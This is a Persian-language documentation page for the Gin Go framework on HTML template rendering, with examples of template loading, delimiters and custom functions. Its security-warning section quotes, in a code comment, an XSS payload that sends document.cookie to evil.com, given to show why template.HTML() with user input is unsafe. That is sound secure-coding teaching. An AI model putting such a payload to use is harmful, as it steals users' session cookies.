---
title: "رندرینگ HTML"
sidebar:
  order: 9
---

Gin از پکیج [html/template](https://pkg.go.dev/html/template) برای رندرینگ HTML استفاده می‌کند.
برای اطلاعات بیشتر درباره نحوه استفاده از آن‌ها، از جمله جای‌نگهنده‌های موجود، مستندات [text/template](https://pkg.go.dev/text/template) را ببینید

از LoadHTMLGlob() یا LoadHTMLFiles() برای انتخاب فایل‌های HTML جهت بارگذاری استفاده کنید.

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/*")
  //router.LoadHTMLFiles("templates/template1.html", "templates/template2.html")
  router.GET("/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{
      "title": "Main website",
    })
  })
  router.Run(":8080")
}
```

templates/index.tmpl

```html
<html>
  <h1>
    {{ .title }}
  </h1>
</html>
```

استفاده از قالب‌ها با نام یکسان در دایرکتوری‌های مختلف

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/**/*")
  router.GET("/posts/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "posts/index.tmpl", gin.H{
      "title": "Posts",
    })
  })
  router.GET("/users/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "users/index.tmpl", gin.H{
      "title": "Users",
    })
  })
  router.Run(":8080")
}
```

**توجه:** لطفاً قالب HTML خود را در بلوک `{{define <template-path>}} {{end}}` قرار دهید و فایل قالب خود را با مسیر نسبی `<template-path>` تعریف کنید. در غیر این صورت، GIN فایل‌های قالب را به درستی تجزیه نمی‌کند.

templates/posts/index.tmpl

```html
{{ define "posts/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using posts/index.tmpl</p>
</html>
{{ end }}
```

templates/users/index.tmpl

```html
{{ define "users/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using users/index.tmpl</p>
</html>
{{ end }}
```

### بارگذاری قالب‌ها از http.FileSystem (نسخه v1.11+)

اگر قالب‌های شما جاگذاری شده‌اند یا توسط `http.FileSystem` ارائه می‌شوند، از `LoadHTMLFS` استفاده کنید:

```go
import (
  "embed"
  "io/fs"
  "net/http"
  "github.com/gin-gonic/gin"
)

//go:embed templates
var tmplFS embed.FS

func main() {
  r := gin.Default()
  sub, _ := fs.Sub(tmplFS, "templates")
  r.LoadHTMLFS(http.FS(sub), "**/*.tmpl")
  r.GET("/", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{"title": "From FS"})
  })
  r.Run(":8080")
}
```

### هشدار امنیتی: `template.HTML()` فرار خودکار را دور می‌زند

پکیج `html/template` Go به طور خودکار مقادیر درج شده در قالب‌ها را برای جلوگیری از حملات اسکریپت بین‌سایتی (XSS) فرار می‌دهد. با این حال، وقتی یک رشته را به `template.HTML()` تبدیل می‌کنید، به طور صریح این حفاظت را دور می‌زنید. اگر رشته شامل ورودی ارائه شده توسط کاربر باشد، مهاجم می‌تواند JavaScript دلخواه تزریق کند.

**ناامن -- هرگز از `template.HTML()` با ورودی کاربر استفاده نکنید:**

```go
// DANGEROUS: attacker controls userInput, which could be:
// <script>document.location='https://evil.com/?cookie='+document.cookie</script>
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": template.HTML(userInput), // XSS vulnerability!
})
```

**ایمن -- اجازه دهید موتور قالب ورودی کاربر را به طور خودکار فرار دهد:**

```go
// SAFE: html/template will escape any HTML/JS in userInput
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": userInput, // auto-escaped by html/template
})
```

فقط از `template.HTML()` برای محتوایی که کاملاً کنترل می‌کنید استفاده کنید، مانند قطعات HTML استاتیک تعریف شده در کد خودتان. هرگز از آن با مقادیری که از ورودی کاربر، فیلدهای پایگاه داده پر شده توسط کاربران یا هر منبع غیرقابل اعتماد دیگری منشأ می‌گیرند استفاده نکنید.

### رندرر قالب سفارشی

همچنین می‌توانید از رندر قالب html خود استفاده کنید

```go
import "html/template"

func main() {
  router := gin.Default()
  html := template.Must(template.ParseFiles("file1", "file2"))
  router.SetHTMLTemplate(html)
  router.Run(":8080")
}
```

### جداکننده‌های سفارشی

می‌توانید از جداکننده‌های سفارشی استفاده کنید

```go
  router := gin.Default()
  router.Delims("{[{", "}]}")
  router.LoadHTMLGlob("/path/to/templates")
```

### توابع قالب سفارشی

[کد نمونه](https://github.com/gin-gonic/examples/tree/master/template) جزئیات را ببینید.

main.go

```go
import (
    "fmt"
    "html/template"
    "net/http"
    "time"

    "github.com/gin-gonic/gin"
)

func formatAsDate(t time.Time) string {
    year, month, day := t.Date()
    return fmt.Sprintf("%d/%02d/%02d", year, month, day)
}

func main() {
    router := gin.Default()
    router.Delims("{[{", "}]}")
    router.SetFuncMap(template.FuncMap{
        "formatAsDate": formatAsDate,
    })
    router.LoadHTMLFiles("./testdata/template/raw.tmpl")

    router.GET("/raw", func(c *gin.Context) {
        c.HTML(http.StatusOK, "raw.tmpl", map[string]interface{}{
            "now": time.Date(2017, 07, 01, 0, 0, 0, 0, time.UTC),
        })
    })

    router.Run(":8080")
}

```

raw.tmpl

```sh
Date: {[{.now | formatAsDate}]}
```

نتیجه:

```sh
Date: 2017/07/01
```
